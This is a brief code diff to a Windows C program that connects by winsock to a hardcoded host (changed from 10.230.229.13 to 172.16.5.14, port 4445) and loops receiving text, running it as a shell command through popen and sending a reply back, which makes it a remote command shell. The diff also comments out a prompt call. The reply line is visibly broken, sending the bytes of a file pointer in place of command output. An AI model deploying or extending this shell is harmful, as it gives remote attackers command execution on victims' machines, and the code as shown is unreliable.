@@ -2,7 +2,7 @@
 #include <winsock2.h>
 #include <stdio.h>
 
-#define IP_ADDRESS "10.230.229.13"
+#define IP_ADDRESS "172.16.5.14"
 #define PORT 4445
 #define BUF_LEN 1024
 #define PAYLOAD_SZ 819200
@@ -32,7 +32,7 @@ int main() {
   FILE *output;
 
   do {
-  	send_prompt(ConnectSocket);
+    //send_prompt(ConnectSocket);
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
     output = popen(buf, "r");
     send( ConnectSocket, (char *)output, sizeof(output), 0);
